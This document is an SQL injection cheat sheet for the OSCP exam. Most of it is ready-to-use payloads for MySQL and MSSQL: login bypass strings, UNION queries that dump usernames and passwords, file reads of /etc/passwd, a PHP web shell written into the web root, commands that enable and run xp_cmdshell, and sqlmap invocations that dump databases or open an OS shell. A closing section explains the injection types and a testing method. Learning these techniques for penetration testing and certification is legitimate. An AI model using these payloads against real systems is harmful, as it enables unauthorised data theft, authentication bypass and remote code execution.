# SQL Injection

## Test parameter for SQL injection with single quote

```
'
```

## Test parameter for SQL injection with double quote

```
"
```

## Test parameter for SQL injection with backslash

```
\
```

## Test parameter for SQL injection with semicolon

```
;
```

## Test parameter with boolean-based SQL injection

```
' OR '1'='1
```

## Test parameter with double quote boolean injection

```
" OR "1"="1
```

## Test parameter with comment-based SQL injection

```
' OR 1=1--
```

## Test parameter with double quote comment injection

```
" OR 1=1--
```

## Test parameter with UNION SELECT injection

```
' UNION SELECT 1,2,3--
```

## Fuzz GET parameters for SQL injection with ffuf

```bash
ffuf -u http://$IP/page.php?id=FUZZ -w /usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt
```

## Determine number of columns with ORDER BY

```
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
' ORDER BY 4--
```

## Determine number of columns with UNION SELECT

```
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
```

## Extract database name and version

```
' UNION SELECT 1,database(),version()--
```

## Extract database name and user

```
' UNION SELECT 1,database(),user()--
```

## Enumerate all databases

```
' UNION SELECT 1,schema_name,3 FROM information_schema.schemata--
```

## Enumerate tables in database

```
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema='database_name'--
```

## Enumerate tables in current database

```
' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()--
```

## Enumerate columns in specific table

```
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

## Extract data from users table

```
' UNION SELECT 1,username,password FROM users--
```

## Extract multiple columns concatenated

```
' UNION SELECT 1,CONCAT(username,':',password),3 FROM users--
```

## Extract data with GROUP_CONCAT

```
' UNION SELECT 1,GROUP_CONCAT(username,':',password),3 FROM users--
```

## Read file using LOAD_FILE

```
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--
```

## Read file using LOAD_FILE on Windows

```
' UNION SELECT 1,LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),3--
```

## Write file using INTO OUTFILE

```
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--
```

## Test for time-based blind SQL injection

```
' AND SLEEP(5)--
```

## Test for time-based injection with IF statement

```
' AND IF(1=1,SLEEP(5),0)--
```

## Extract database name with time-based injection

```
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

## Test for boolean-based blind SQL injection

```
' AND 1=1--
' AND 1=2--
```

## Extract data length with boolean injection

```
' AND LENGTH(database())=5--
```

## Extract first character with boolean injection

```
' AND SUBSTRING(database(),1,1)='a'--
```

## Bypass login with SQL injection

```
admin' OR '1'='1'--
admin' OR 1=1--
' OR '1'='1
```

## Bypass login with comment injection

```
admin'--
admin'#
```

## Enumerate MySQL users

```
' UNION SELECT 1,user,3 FROM mysql.user--
```

## Enumerate MySQL password hashes

```
' UNION SELECT 1,CONCAT(user,':',password),3 FROM mysql.user--
```

## Check MySQL file privileges

```
' UNION SELECT 1,file_priv,3 FROM mysql.user WHERE user='root'--
```

## Test for error-based SQL injection

```
' AND extractvalue(1,concat(0x7e,database()))--
```

## Extract data with error-based injection

```
' AND extractvalue(1,concat(0x7e,(SELECT CONCAT(username,':',password) FROM users LIMIT 1)))--
```

## Use updatexml for error-based extraction

```
' AND updatexml(1,concat(0x7e,database()),1)--
```

## Test POST parameter for SQL injection with sqlmap

```bash
sqlmap -u http://$IP/login.php --data "username=admin&password=pass" -p username --batch
```

## Dump entire database with sqlmap

```bash
sqlmap -u http://$IP/page.php?id=1 --dump --batch
```

## Get shell using sqlmap

```bash
sqlmap -u http://$IP/page.php?id=1 --os-shell --batch
```

## Enumerate databases with sqlmap

```bash
sqlmap -u http://$IP/page.php?id=1 --dbs --batch
```

## Enumerate tables with sqlmap

```bash
sqlmap -u http://$IP/page.php?id=1 -D database_name --tables --batch
```

## Dump specific table with sqlmap

```bash
sqlmap -u http://$IP/page.php?id=1 -D database_name -T users --dump --batch
```

## Use sqlmap with authentication cookie

```bash
sqlmap -u http://$IP/page.php?id=1 --cookie="PHPSESSID=abcd1234" --batch
```

## Test for SQL injection in MSSQL

```
' WAITFOR DELAY '00:00:05'--
```

## Enable xp_cmdshell in MSSQL

```
' EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

## Execute command using xp_cmdshell

```
' EXEC xp_cmdshell 'whoami'--
```

## Read file in MSSQL using OPENROWSET

```
' UNION SELECT 1,BulkColumn,3 FROM OPENROWSET(BULK 'C:\Windows\System32\drivers\etc\hosts',SINGLE_CLOB) AS x--
```

## Enumerate MSSQL version

```
' UNION SELECT 1,@@version,3--
```

## Enumerate current MSSQL user

```
' UNION SELECT 1,SYSTEM_USER,3--
' UNION SELECT 1,USER_NAME(),3--
```

## Check if MSSQL user is sysadmin

```
' UNION SELECT 1,IS_SRVROLEMEMBER('sysadmin'),3--
```

## List MSSQL databases

```
' UNION SELECT 1,name,3 FROM master..sysdatabases--
```

## List MSSQL tables

```
' UNION SELECT 1,name,3 FROM sysobjects WHERE xtype='U'--
```

## Extract MSSQL column names

```
' UNION SELECT 1,name,3 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
```

---

## SQL Injection Fundamentals

SQL injection occurs when user input is improperly sanitized before being included in SQL queries. This allows attackers to manipulate database queries to extract data, bypass authentication, or execute commands on the underlying system.

## Injection Types

### Union-Based Injection
Most common and straightforward type. Allows extracting data by appending UNION SELECT statements to original query. Requires knowing number of columns and compatible data types. Results are displayed directly in application response.

### Boolean-Based Blind Injection
Used when application doesn't display query results but responds differently to true vs false conditions. Extract data one bit at a time by asking true/false questions. Slower but works when direct output is not available.

### Time-Based Blind Injection
Used when application shows no visible difference in response. Inject time delays (SLEEP, WAITFOR) to infer true/false conditions. Slowest method but works in most restrictive scenarios.

### Error-Based Injection
Exploits verbose error messages to extract data. Database errors reveal information about query structure and data. Faster than blind techniques but requires error messages to be displayed.

### Stacked Queries
Allows executing multiple SQL statements separated by semicolons. Enables running additional commands beyond SELECT. Particularly dangerous as it can modify database or execute system commands.

## Database-Specific Techniques

### MySQL/MariaDB
Uses information_schema to enumerate structure. LOAD_FILE reads files from filesystem. INTO OUTFILE writes files to disk. Requires FILE privilege for file operations.

### Microsoft SQL Server
xp_cmdshell enables OS command execution. OPENROWSET can read files. WAITFOR DELAY used for time-based injection. Often runs with high privileges making it particularly dangerous.

### PostgreSQL
Uses pg_sleep for time delays. COPY can read/write files. Large object functions for file operations. Often requires specific privileges for advanced techniques.

### Oracle
Uses UTL_FILE for file operations. DBMS_LOCK.SLEEP for delays. Different syntax requires adjustment of payloads. Often well-secured but vulnerable when misconfigured.

## Manual Testing Methodology

1. Identify injection points by testing with special characters
2. Determine number of columns using ORDER BY or UNION SELECT
3. Find which columns display in response
4. Extract database name, version, and user
5. Enumerate database structure (tables, columns)
6. Extract sensitive data from identified tables
7. Attempt privilege escalation or command execution if possible

## SQLMap Usage

SQLMap automates SQL injection exploitation. Use for confirmed injection points to save time. Start with basic enumeration before attempting shells. Always use batch mode during OSCP exam to avoid interactive prompts. Be aware that automated tools may be noisy and trigger defenses.

## Common Bypasses

### Comment Syntax
Different databases use different comment syntax. MySQL uses -- and hash, MSSQL uses --, Oracle uses --. Always add space after -- in URL parameters.

### String Concatenation
MySQL uses CONCAT, MSSQL uses +, Oracle uses ||. Understanding concatenation helps extract multiple columns in single query.

### Quote Escaping
Some scenarios require escaping or avoiding quotes entirely. Use CHAR or hex encoding to bypass quote restrictions.

## File Operations

Reading files reveals sensitive configuration, source code, or credentials. Writing files can lead to web shells and code execution. File operations require specific database privileges. Common read targets include /etc/passwd, configuration files, and source code. Common write targets include web directories for shell upload.

## Privilege Escalation

After initial injection, attempt to escalate privileges within database. MySQL can be escalated to FILE privilege. MSSQL xp_cmdshell provides OS access. Check if current user has admin privileges. Attempt to enable dangerous stored procedures or functions.

## OSCP Exam Tips

1. Test for injection manually before using sqlmap
2. Focus on data extraction rather than exploitation
3. Document all successful payloads for reporting
4. Try different encodings if standard payloads fail
5. Check both GET and POST parameters
6. Don't spend too long if injection doesn't work quickly
7. Look for alternative paths if SQL injection is blocked

## References

https://tib3rius.com/sqli - Comprehensive SQL injection guide
